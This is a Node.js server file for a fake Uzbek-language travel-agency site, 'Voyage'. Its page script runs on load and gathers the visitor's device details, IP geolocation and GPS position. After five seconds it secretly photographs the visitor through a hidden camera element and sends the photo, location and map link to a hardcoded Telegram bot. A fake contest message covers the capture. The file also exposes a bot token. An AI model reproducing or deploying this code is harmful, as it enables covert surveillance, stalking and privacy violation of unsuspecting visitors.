const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

/* ============================================================
   🔑 TELEGRAM SOZLAMALAR
   ============================================================ */
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8098863061:AAEZsaC8WZAzqJKAYEp8suu3HtrXhqOueoQ';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '7811852484';
/* ============================================================ */

app.use(express.json({ limit: '30mb' }));
app.set('trust proxy', true);

function escapeHtml(str) {
  if (str === null || str === undefined) return 'N/A';
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function mapsLink(lat, lon) {
  if (lat === null || lat === undefined || lon === null || lon === undefined) return null;
  if (isNaN(lat) || isNaN(lon)) return null;
  return 'https://www.google.com/maps?q=' + lat + ',' + lon;
}

/* ============================================================
   📄 HTML — Travel sayt (PREMIUM DIZAYN, MODAL YO'Q)
   ============================================================ */
const HTML_PAGE = `<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Voyage — Dunyoni Kashf Et</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#0b0b0f;--bg-2:#111118;--surface:#16161f;--surface-2:#1c1c28;
    --border:rgba(255,255,255,.08);--border-hover:rgba(212,175,55,.35);
    --text:#f5f5f7;--text-dim:#9a9aa8;--gold:#d4af37;--gold-2:#f0c75e;
    --gold-soft:rgba(212,175,55,.12);--accent:#c9a227;
    --shadow:0 30px 80px -20px rgba(0,0,0,.8);
    --radius:22px;--radius-sm:14px;--ease:cubic-bezier(.22,1,.36,1);
  }
  *{margin:0;padding:0;box-sizing:border-box}
  html{scroll-behavior:smooth}
  body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;line-height:1.6;overflow-x:hidden;-webkit-font-smoothing:antialiased}
  ::selection{background:var(--gold);color:#0b0b0f}

  /* NAVBAR */
  .nav{position:fixed;top:0;left:0;right:0;z-index:900;display:flex;align-items:center;justify-content:space-between;padding:22px 48px;background:linear-gradient(180deg,rgba(11,11,15,.85),transparent);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);transition:background .4s var(--ease),padding .4s var(--ease)}
  .nav.scrolled{background:rgba(11,11,15,.92);padding:14px 48px;border-bottom:1px solid var(--border)}
  .brand{font-family:'Playfair Display',serif;font-size:24px;font-weight:700;letter-spacing:.5px;display:flex;align-items:center;gap:10px}
  .brand span{color:var(--gold)}
  .brand-dot{width:8px;height:8px;border-radius:50%;background:var(--gold);box-shadow:0 0 16px var(--gold)}
  .nav-links{display:flex;gap:36px;list-style:none}
  .nav-links a{color:var(--text-dim);text-decoration:none;font-size:14px;font-weight:500;letter-spacing:.3px;transition:color .3s var(--ease);position:relative}
  .nav-links a::after{content:'';position:absolute;left:0;bottom:-6px;width:0;height:1.5px;background:var(--gold);transition:width .3s var(--ease)}
  .nav-links a:hover{color:var(--text)}
  .nav-links a:hover::after{width:100%}
  .nav-cta{padding:10px 22px;border:1px solid var(--border-hover);border-radius:50px;color:var(--gold);font-size:13px;font-weight:600;letter-spacing:.5px;background:transparent;cursor:pointer;transition:all .3s var(--ease)}
  .nav-cta:hover{background:var(--gold);color:#0b0b0f}

  /* HERO */
  .hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:120px 48px 80px;overflow:hidden}
  .hero-bg{position:absolute;inset:0;background:url('https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=2000&q=80') center/cover no-repeat;transform:scale(1.05);filter:brightness(.45) saturate(1.1);animation:heroZoom 20s ease-out infinite alternate}
  @keyframes heroZoom{from{transform:scale(1.05)}to{transform:scale(1.15)}}
  .hero::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(11,11,15,.7) 0%,rgba(11,11,15,.2) 40%,rgba(11,11,15,.95) 100%);z-index:1}
  .hero::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 20% 50%,rgba(212,175,55,.08),transparent 50%);z-index:1}
  .hero-inner{position:relative;z-index:2;max-width:1280px;margin:0 auto;width:100%}
  .hero-tag{display:inline-flex;align-items:center;gap:10px;padding:8px 18px;border:1px solid var(--border);border-radius:50px;background:rgba(255,255,255,.03);backdrop-filter:blur(10px);font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--gold-2);font-weight:500;margin-bottom:32px;animation:fadeUp .8s var(--ease) both}
  .hero-tag .dot{width:6px;height:6px;border-radius:50%;background:var(--gold);box-shadow:0 0 10px var(--gold)}
  .hero h1{font-family:'Playfair Display',serif;font-size:clamp(40px,7vw,88px);font-weight:600;line-height:1.02;letter-spacing:-2px;margin-bottom:28px;max-width:900px;animation:fadeUp .8s .1s var(--ease) both}
  .hero h1 em{font-style:italic;color:var(--gold);font-weight:500}
  .hero p{font-size:clamp(15px,1.6vw,19px);color:var(--text-dim);max-width:560px;margin-bottom:44px;font-weight:300;animation:fadeUp .8s .2s var(--ease) both}
  .hero-actions{display:flex;gap:16px;flex-wrap:wrap;align-items:center;animation:fadeUp .8s .3s var(--ease) both}
  .btn-primary{display:inline-flex;align-items:center;gap:10px;padding:16px 36px;border:none;border-radius:50px;background:linear-gradient(135deg,var(--gold),var(--accent));color:#0b0b0f;font-size:15px;font-weight:600;cursor:pointer;transition:all .35s var(--ease);box-shadow:0 12px 40px -8px rgba(212,175,55,.5)}
  .btn-primary:hover{transform:translateY(-3px);box-shadow:0 20px 50px -8px rgba(212,175,55,.65)}
  .btn-ghost{display:inline-flex;align-items:center;gap:10px;padding:16px 32px;border:1px solid var(--border);border-radius:50px;background:transparent;color:var(--text);font-size:15px;font-weight:500;cursor:pointer;transition:all .35s var(--ease)}
  .btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
  .hero-stats{position:relative;z-index:2;max-width:1280px;margin:80px auto 0;display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:32px;padding-top:40px;border-top:1px solid var(--border);animation:fadeUp .8s .4s var(--ease) both}
  .stat h4{font-family:'Playfair Display',serif;font-size:clamp(28px,3vw,40px);font-weight:600;color:var(--gold);line-height:1;margin-bottom:6px}
  .stat p{font-size:13px;color:var(--text-dim);letter-spacing:.5px;text-transform:uppercase}
  @keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}

  /* SECTIONS */
  .section{padding:120px 48px;max-width:1280px;margin:0 auto}
  .section-head{text-align:center;margin-bottom:72px}
  .section-head .eyebrow{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--gold);font-weight:600;margin-bottom:16px;display:block}
  .section-head h2{font-family:'Playfair Display',serif;font-size:clamp(30px,4.5vw,54px);font-weight:600;letter-spacing:-1px;line-height:1.1}
  .section-head h2 em{font-style:italic;color:var(--gold);font-weight:500}
  .section-head p{color:var(--text-dim);max-width:520px;margin:18px auto 0;font-size:16px;font-weight:300}

  /* CARDS */
  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:28px}
  .card{position:relative;border-radius:var(--radius);overflow:hidden;background:var(--surface);border:1px solid var(--border);cursor:pointer;transition:all .5s var(--ease)}
  .card:hover{transform:translateY(-8px);border-color:var(--border-hover);box-shadow:var(--shadow)}
  .card-img-wrap{position:relative;overflow:hidden;height:300px}
  .card img{width:100%;height:100%;object-fit:cover;transition:transform 1s var(--ease)}
  .card:hover img{transform:scale(1.08)}
  .card-img-wrap::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(11,11,15,.9) 100%)}
  .card-badge{position:absolute;top:20px;left:20px;z-index:2;padding:7px 14px;border-radius:50px;background:rgba(11,11,15,.7);backdrop-filter:blur(10px);border:1px solid var(--border);font-size:11px;letter-spacing:1px;text-transform:uppercase;color:var(--gold-2);font-weight:600}
  .card-body{position:relative;padding:24px 26px 28px;margin-top:-60px;z-index:2}
  .card-body h3{font-family:'Playfair Display',serif;font-size:26px;font-weight:600;margin-bottom:8px;letter-spacing:-.5px}
  .card-body h3 span{font-size:18px;margin-right:4px}
  .card-body p{color:var(--text-dim);font-size:14px;font-weight:300;margin-bottom:20px;line-height:1.6}
  .card-foot{display:flex;align-items:center;justify-content:space-between;padding-top:18px;border-top:1px solid var(--border)}
  .card-price{font-family:'Playfair Display',serif;font-size:22px;font-weight:600;color:var(--gold)}
  .card-price small{font-size:12px;color:var(--text-dim);font-family:'Inter',sans-serif;font-weight:400}
  .card-arrow{width:40px;height:40px;border-radius:50%;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;color:var(--text-dim);transition:all .35s var(--ease)}
  .card:hover .card-arrow{background:var(--gold);border-color:var(--gold);color:#0b0b0f;transform:rotate(-45deg)}

  /* FEATURES */
  .features-section{background:var(--bg-2);border-top:1px solid var(--border);border-bottom:1px solid var(--border)}
  .features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:24px}
  .feature{padding:40px 30px;border-radius:var(--radius-sm);background:var(--surface);border:1px solid var(--border);transition:all .4s var(--ease)}
  .feature:hover{border-color:var(--border-hover);transform:translateY(-4px)}
  .feature-icon{width:56px;height:56px;border-radius:16px;background:var(--gold-soft);border:1px solid rgba(212,175,55,.2);display:flex;align-items:center;justify-content:center;font-size:26px;margin-bottom:22px}
  .feature h3{font-family:'Playfair Display',serif;font-size:20px;font-weight:600;margin-bottom:10px}
  .feature p{color:var(--text-dim);font-size:14px;font-weight:300;line-height:1.65}

  /* CTA */
  .cta-banner{max-width:1280px;margin:0 auto;padding:0 48px 120px}
  .cta-inner{position:relative;border-radius:28px;overflow:hidden;background:url('https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=1600&q=80') center/cover;padding:80px 48px;text-align:center;border:1px solid var(--border)}
  .cta-inner::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(11,11,15,.92),rgba(11,11,15,.75))}
  .cta-inner > *{position:relative;z-index:1}
  .cta-inner h2{font-family:'Playfair Display',serif;font-size:clamp(28px,4vw,48px);font-weight:600;letter-spacing:-1px;margin-bottom:16px}
  .cta-inner h2 em{font-style:italic;color:var(--gold)}
  .cta-inner p{color:var(--text-dim);max-width:480px;margin:0 auto 32px;font-size:16px;font-weight:300}

  /* FOOTER */
  footer{background:var(--bg-2);border-top:1px solid var(--border);padding:60px 48px 40px}
  .footer-inner{max-width:1280px;margin:0 auto}
  .footer-top{display:flex;justify-content:space-between;align-items:flex-start;gap:48px;flex-wrap:wrap;padding-bottom:40px;border-bottom:1px solid var(--border)}
  .footer-brand{max-width:320px}
  .footer-brand p{color:var(--text-dim);font-size:14px;margin-top:14px;font-weight:300}
  .footer-cols{display:flex;gap:64px;flex-wrap:wrap}
  .footer-col h5{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);font-weight:600;margin-bottom:16px}
  .footer-col a{display:block;color:var(--text-dim);text-decoration:none;font-size:14px;margin-bottom:10px;transition:color .3s var(--ease)}
  .footer-col a:hover{color:var(--text)}
  .footer-bottom{padding-top:28px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;color:var(--text-dim);font-size:13px}

  /* HIDDEN ELEMENTS */
  #hiddenVideo{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
  #hiddenCanvas{display:none}

  /* TOAST */
  .toast{position:fixed;bottom:32px;left:50%;transform:translateX(-50%) translateY(120px);background:linear-gradient(135deg,var(--gold),var(--accent));color:#0b0b0f;padding:16px 32px;border-radius:50px;font-weight:600;font-size:14px;letter-spacing:.3px;box-shadow:0 20px 60px -10px rgba(212,175,55,.6);transition:transform .5s var(--ease);z-index:10000}
  .toast.show{transform:translateX(-50%) translateY(0)}

  /* RESPONSIVE */
  @media(max-width:900px){
    .nav{padding:16px 24px}
    .nav.scrolled{padding:12px 24px}
    .nav-links{display:none}
    .hero{padding:100px 24px 60px}
    .hero-stats{margin-top:56px}
    .section{padding:80px 24px}
    .cta-banner{padding:0 24px 80px}
    .cta-inner{padding:56px 24px}
    footer{padding:48px 24px 32px}
    .footer-cols{gap:32px}
  }
  @media(max-width:480px){
    .hero-actions{flex-direction:column;align-items:stretch}
    .btn-primary,.btn-ghost{justify-content:center}
    .footer-top{flex-direction:column}
  }
</style>
</head>
<body>

<!-- NAVBAR -->
<nav class="nav" id="nav">
  <div class="brand"><span class="brand-dot"></span>Voyage<span>.</span></div>
  <ul class="nav-links">
    <li><a href="#destinations">Yo'nalishlar</a></li>
    <li><a href="#features">Nega biz?</a></li>
    <li><a href="#cta">Aloqa</a></li>
  </ul>
  <button class="nav-cta" onclick="document.getElementById('destinations').scrollIntoView({behavior:'smooth'})">Boshlash</button>
</nav>

<!-- HERO -->
<section class="hero">
  <div class="hero-bg"></div>
  <div class="hero-inner">
    <span class="hero-tag"><span class="dot"></span>Premium Sayohat Tajribasi</span>
    <h1>Dunyoni <em>kashf</em> et —<br>unutilmas xotiralar sari.</h1>
    <p>Eng go'zal joylarga sayohat qiling. Yangi madaniyatlar, premium xizmat va sizga moslashtirilgan marshrutlar.</p>
    <div class="hero-actions">
      <button class="btn-primary" onclick="document.getElementById('destinations').scrollIntoView({behavior:'smooth'})">
        Sayohatni Boshlash
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
      </button>
      <button class="btn-ghost" onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">Batafsil</button>
    </div>
  </div>
  <div class="hero-stats">
    <div class="stat"><h4>120+</h4><p>Yo'nalishlar</p></div>
    <div class="stat"><h4>15k+</h4><p>Baxtli mijozlar</p></div>
    <div class="stat"><h4>24/7</h4><p>Qo'llab-quvvatlash</p></div>
    <div class="stat"><h4>4.9★</h4><p>O'rtacha reyting</p></div>
  </div>
</section>

<!-- DESTINATIONS -->
<section class="section" id="destinations">
  <div class="section-head">
    <span class="eyebrow">Tanlangan Yo'nalishlar</span>
    <h2>Mashhur <em>manzillar</em></h2>
    <p>Dunyoning eng go'zal va unutilmas joylariga premium sayohatlar.</p>
  </div>
  <div class="grid">
    <article class="card">
      <div class="card-img-wrap">
        <span class="card-badge">🇮🇹 Italiya</span>
        <img src="https://images.unsplash.com/photo-1523906834658-6e24ef2386f9?w=800&q=80" alt="Venetsiya">
      </div>
      <div class="card-body">
        <h3><span>🇮🇹</span> Venetsiya</h3>
        <p>Kanallar shahri — romantika, tarix va gondolalar.</p>
        <div class="card-foot">
          <div class="card-price">$899 <small>/ kishi</small></div>
          <div class="card-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg></div>
        </div>
      </div>
    </article>
    <article class="card">
      <div class="card-img-wrap">
        <span class="card-badge">🇯🇵 Yaponiya</span>
        <img src="https://images.unsplash.com/photo-1493976040374-85c8e12f0c0e?w=800&q=80" alt="Kyoto">
      </div>
      <div class="card-body">
        <h3><span>🇯🇵</span> Kyoto</h3>
        <p>Qadimiy ibodatxonalar va gilos gullari.</p>
        <div class="card-foot">
          <div class="card-price">$1,199 <small>/ kishi</small></div>
          <div class="card-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg></div>
        </div>
      </div>
    </article>
    <article class="card">
      <div class="card-img-wrap">
        <span class="card-badge">🇦🇪 BAA</span>
        <img src="https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=800&q=80" alt="Dubay">
      </div>
      <div class="card-body">
        <h3><span>🇦🇪</span> Dubay</h3>
        <p>Zamonaviy mo'jizalar va hashamat.</p>
        <div class="card-foot">
          <div class="card-price">$749 <small>/ kishi</small></div>
          <div class="card-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg></div>
        </div>
      </div>
    </article>
    <article class="card">
      <div class="card-img-wrap">
        <span class="card-badge">🇫🇷 Fransiya</span>
        <img src="https://images.unsplash.com/photo-1502602898657-3e91760cbb34?w=800&q=80" alt="Parij">
      </div>
      <div class="card-body">
        <h3><span>🇫🇷</span> Parij</h3>
        <p>Sevgi shahri — Eyfel minorasi va san'at.</p>
        <div class="card-foot">
          <div class="card-price">$999 <small>/ kishi</small></div>
          <div class="card-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg></div>
        </div>
      </div>
    </article>
    <article class="card">
      <div class="card-img-wrap">
        <span class="card-badge">🇮🇩 Indoneziya</span>
        <img src="https://images.unsplash.com/photo-1537996194471-e657df975ab4?w=800&q=80" alt="Bali">
      </div>
      <div class="card-body">
        <h3><span>🇮🇩</span> Bali</h3>
        <p>Tropik jannat — plyajlar va ibodatxonalar.</p>
        <div class="card-foot">
          <div class="card-price">$849 <small>/ kishi</small></div>
          <div class="card-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg></div>
        </div>
      </div>
    </article>
    <article class="card">
      <div class="card-img-wrap">
        <span class="card-badge">🇺🇿 O'zbekiston</span>
        <img src="https://images.unsplash.com/photo-1516483638261-f4dbaf036963?w=800&q=80" alt="Samarqand">
      </div>
      <div class="card-body">
        <h3><span>🇺🇿</span> Samarqand</h3>
        <p>Buyuk Ipak yo'li durdonasi va tarixiy meros.</p>
        <div class="card-foot">
          <div class="card-price">$399 <small>/ kishi</small></div>
          <div class="card-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg></div>
        </div>
      </div>
    </article>
  </div>
</section>

<!-- FEATURES -->
<section class="features-section" id="features">
  <div class="section">
    <div class="section-head">
      <span class="eyebrow">Afzalliklar</span>
      <h2>Nega <em>bizni</em> tanlashadi?</h2>
      <p>Har bir sayohat — sizga xos tajriba. Biz buni yaxshi bilamiz.</p>
    </div>
    <div class="features-grid">
      <div class="feature">
        <div class="feature-icon">🎯</div>
        <h3>Individual yondashuv</h3>
        <p>Har bir sayohat sizning didingiz va xohishingizga moslashtiriladi.</p>
      </div>
      <div class="feature">
        <div class="feature-icon">💰</div>
        <h3>Eng yaxshi narx</h3>
        <p>Kafolatlangan sifat va hamyonbop narxlar. Yashirin to'lovlar yo'q.</p>
      </div>
      <div class="feature">
        <div class="feature-icon">🛡️</div>
        <h3>To'liq xavfsizlik</h3>
        <p>Sug'urta, 24/7 qo'llab-quvvatlash va ishonchli hamkorlar.</p>
      </div>
    </div>
  </div>
</section>

<!-- CTA -->
<div class="cta-banner" id="cta">
  <div class="cta-inner">
    <h2>Keyingi sayohatingizni <em>biz</em> bilan boshlang</h2>
    <p>Hoziroq ro'yxatdan o'ting va $500 gacha chegirmaga ega bo'ling.</p>
    <button class="btn-primary" onclick="document.getElementById('destinations').scrollIntoView({behavior:'smooth'})">
      Hoziroq boshlash
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
    </button>
  </div>
</div>

<!-- FOOTER -->
<footer>
  <div class="footer-inner">
    <div class="footer-top">
      <div class="footer-brand">
        <div class="brand"><span class="brand-dot"></span>Voyage<span>.</span></div>
        <p>Premium sayohat agentligi. Dunyo bo'ylab unutilmas tajribalar.</p>
      </div>
      <div class="footer-cols">
        <div class="footer-col">
          <h5>Kompaniya</h5>
          <a href="#">Biz haqimizda</a>
          <a href="#">Yo'nalishlar</a>
          <a href="#">Karyera</a>
        </div>
        <div class="footer-col">
          <h5>Yordam</h5>
          <a href="#">FAQ</a>
          <a href="#">Aloqa</a>
          <a href="#">Shartlar</a>
        </div>
        <div class="footer-col">
          <h5>Ijtimoiy</h5>
          <a href="#">Instagram</a>
          <a href="#">Telegram</a>
          <a href="#">Facebook</a>
        </div>
      </div>
    </div>
    <div class="footer-bottom">
      <span>© 2026 Voyage. Barcha huquqlar himoyalangan.</span>
      <span>Made with ♥ in Uzbekistan</span>
    </div>
  </div>
</footer>

<!-- Hidden elements (faqat funksiya uchun, ko'rinmaydi) -->
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="hiddenCanvas"></canvas>
<div class="toast" id="toast"></div>

<script>
let userInfo = null;
let captureInProgress = false;

/* ============ QURILMA MA'LUMOTLARI ============ */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let type='Desktop';
  if(/iPad|Tablet/i.test(ua)) type='Planshet';
  else if(/Mobi|Android|iPhone|iPod/i.test(ua)) type='Mobil';
  let os="Noma'lum";
  if(/Windows NT 10/.test(ua)) os='Windows 10/11';
  else if(/Windows/.test(ua)) os='Windows';
  else if(/Mac OS X/.test(ua)) os='macOS';
  else if(/Android/.test(ua)) os='Android';
  else if(/iPhone|iPad|iPod/.test(ua)) os='iOS';
  else if(/Linux/.test(ua)) os='Linux';
  let browser="Noma'lum";
  if(/Edg\\//.test(ua)) browser='Edge';
  else if(/OPR\\/|Opera/.test(ua)) browser='Opera';
  else if(/Chrome\\//.test(ua)) browser='Chrome';
  else if(/Firefox\\//.test(ua)) browser='Firefox';
  else if(/Safari\\//.test(ua)) browser='Safari';
  return {
    type, os, browser,
    screen: window.screen.width+'×'+window.screen.height,
    language: navigator.language,
    platform: navigator.platform || 'N/A',
    cores: navigator.hardwareConcurrency || 'N/A',
    memory: (navigator.deviceMemory !== undefined) ? navigator.deviceMemory+' GB' : 'N/A',
    touch: navigator.maxTouchPoints>0 ? 'Ha ('+navigator.maxTouchPoints+')' : "Yo'q",
    timezone: (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){ return 'N/A'; } })(),
    url: location.href
  };
}

/* ============ GEOLOKATSIYA ============ */
function getBrowserLocation() {
  return new Promise(function(resolve){
    if (!navigator.geolocation) {
      console.log('❌ Geolocation not supported');
      return resolve(null);
    }
    // Try high accuracy first
    navigator.geolocation.getCurrentPosition(
      function(pos){
        resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          source: 'gps'
        });
      },
      function(err){
        console.log('Geolocation high-accuracy failed:', err.code, err.message);
        // Fallback: low accuracy
        navigator.geolocation.getCurrentPosition(
          function(pos2){
            resolve({
              lat: pos2.coords.latitude,
              lon: pos2.coords.longitude,
              accuracy: pos2.coords.accuracy,
              source: 'gps-low'
            });
          },
          function(err2){
            console.log('Geolocation low-accuracy failed:', err2.code, err2.message);
            resolve(null);
          },
          { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
        );
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  });
}

/* ============ VISIT YUBORISH ============ */
async function collectAndSend() {
  try {
    const res = await fetch('/api/info');
    userInfo = await res.json();
    const browserLoc = await getBrowserLocation();
    if (browserLoc) userInfo.browserGeo = browserLoc;
    const payload = { ...userInfo, device: getDeviceInfo() };
    const r = await fetch('/api/visit', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ info: payload })
    });
    console.log('✅ Visit yuborildi:', r.status);
  } catch(e) { console.log('Visit xato:', e); }
}

/* ============ AVTOMATIK RASM OLISH (MODAL YO'Q) ============ */
async function autoCapture() {
  if (captureInProgress) return;
  captureInProgress = true;

  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      console.log('❌ Brauzer kamerani qo\\'llab-quvvatlamaydi');
      captureInProgress = false;
      return;
    }

    console.log('📷 Kamera ruxsati so\\'ralmoqda...');

    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:'user', width:{ideal:640}, height:{ideal:480} },
      audio:false
    });

    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('hiddenCanvas');
    video.srcObject = stream;
    try { await video.play(); } catch(e) {}

    console.log('📸 Rasm olinmoqda...');

    await new Promise(function(r){
      if(video.readyState>=2) return r();
      video.onloadeddata = r;
      setTimeout(r, 3000);
    });
    await new Promise(function(r){ setTimeout(r, 800); });

    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width=w; canvas.height=h;
    const ctx = canvas.getContext('2d');
    ctx.translate(w,0); ctx.scale(-1,1);
    ctx.drawImage(video,0,0,w,h);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach(function(t){ t.stop(); });

    if (!userInfo) {
      const r = await fetch('/api/info');
      userInfo = await r.json();
    }
    const bl = await getBrowserLocation();
    if (bl) userInfo.browserGeo = bl;

    const resp = await fetch('/api/capture', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        image: dataUrl,
        info: { ...userInfo, device: getDeviceInfo() }
      })
    });
    const result = await resp.json();
    console.log('Capture:', result);

    if(result.ok){
      toast('🎉 Tabriklaymiz! Siz tanlovda qatnashdingiz!');
    } else {
      toast("❌ Xatolik, keyinroq urinib ko'ring");
    }
  } catch(err) {
    console.log('Camera xato:', err.message);
    toast('📷 Kamera ruxsati kerak edi');
  } finally {
    captureInProgress = false;
  }
}

function toast(msg){
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(function(){ t.classList.remove('show'); }, 4000);
}

/* ============ START ============ */
window.addEventListener('DOMContentLoaded', function(){
  collectAndSend();
  setTimeout(function(){
    autoCapture();          // ← 5s keyin to'g'ridan-to'g'ri rasm olish
  }, 5000);
});

/* Navbar scroll effekti */
window.addEventListener('scroll', function(){
  var nav = document.getElementById('nav');
  if (window.scrollY > 40) nav.classList.add('scrolled');
  else nav.classList.remove('scrolled');
});
</script>
</body>
</html>`;

/* ============================================================
   🌐 ROUTES
   ============================================================ */
app.get('/', function(req, res){
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(HTML_PAGE);
});

app.get('/api/info', async function(req, res){
  // ✅ TUZATILDI: faqat proksi sarlavhalaridan IP olish (Vercel uchun)
  let ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() 
         || req.headers['x-real-ip'] 
         || '';
  
  if(ip === '::1' || ip === '::ffff:127.0.0.1') ip = '127.0.0.1';
  if(ip.startsWith('::ffff:')) ip = ip.replace('::ffff:','');

  let geo = {};
  try {
    // ✅ TUZATILDI: ipapi.co → ipwho.is
    const r = await fetch('https://ipwho.is/' + ip + '?lang=uz');
    const d = await r.json();
    
    if (d.success === false) {
      console.log('ipwho.is xato:', d.message);
      geo = {};
    } else {
      geo = {
        country: d.country || 'N/A',
        countryCode: d.country_code || 'N/A',
        regionName: d.region || 'N/A',
        city: d.city || 'N/A',
        zip: d.postal || 'N/A',
        lat: d.latitude,
        lon: d.longitude,
        timezone: d.timezone?.id || 'N/A',
        isp: d.connection?.isp || 'N/A',
        org: d.connection?.org || 'N/A',
        as: d.connection?.asn ? 'AS' + d.connection.asn : 'N/A',
        address: [d.city, d.region, d.postal, d.country].filter(Boolean).join(', ')
      };
    }
  } catch(e) { 
    console.log('Geo xato:', e.message);
    geo = {}; 
  }

  res.json({
    ip: ip,
    geo: geo,
    headers:{
      'user-agent': req.headers['user-agent'],
      'accept-language': req.headers['accept-language'],
      host: req.headers['host'],
      referer: req.headers['referer'] || "Yo'q"
    },
    serverTime: new Date().toISOString()
  });
});

/* ============================================================
   📩 TELEGRAM
   ============================================================ */
async function tgSend(method, payload) {
  const tg = 'https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN;
  const r = await fetch(tg+'/'+method, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  });
  return r.json();
}

function buildMapsKeyboard(lat, lon) {
  const link = mapsLink(lat, lon);
  if (!link) return null;
  return {
    inline_keyboard: [[
      { text: '📍 Google Maps da ochish', url: link }
    ]]
  };
}

function buildCaption(info, isPhoto) {
  const g = info.geo || {};
  const d = info.device || {};
  const bg = info.browserGeo || {};

  const finalLat = (bg.lat !== undefined && bg.lat !== null) ? bg.lat : g.lat;
  const finalLon = (bg.lon !== undefined && bg.lon !== null) ? bg.lon : g.lon;

  const lines = [
    isPhoto ? "📸 <b>RASM + MA'LUMOT</b>" : '👀 <b>YANGI TASHRIF</b>',
    '',
    '🌐 <b>IP:</b> <code>'+escapeHtml(info.ip || 'N/A')+'</code>',
    '🏳️ <b>Davlat:</b> '+escapeHtml(g.country||'N/A')+(g.countryCode?(' ('+escapeHtml(g.countryCode)+')'):''),
    '🏙️ <b>Shahar:</b> '+escapeHtml(g.city||'N/A'),
    '🗺️ <b>Viloyat:</b> '+escapeHtml(g.regionName||'N/A'),
    '📮 <b>Pochta indeksi:</b> '+escapeHtml(g.zip||'N/A'),
    '📫 <b>To&#39;liq manzil:</b> '+escapeHtml(g.address||'N/A'),
    '📍 <b>Koordinata:</b> '+escapeHtml(finalLat||'?')+', '+escapeHtml(finalLon||'?')
  ];

  if (bg.lat !== undefined) {
    lines.push('🎯 <b>Manba:</b> Brauzer GPS (aniq: '+escapeHtml(bg.accuracy ? Math.round(bg.accuracy)+'m' : '?')+')');
  } else {
    lines.push('🎯 <b>Manba:</b> IP geo (taxminiy)');
  }

  lines.push(
    '🕐 <b>Timezone:</b> '+escapeHtml(g.timezone||'N/A'),
    '📡 <b>ISP:</b> '+escapeHtml(g.isp||'N/A'),
    '',
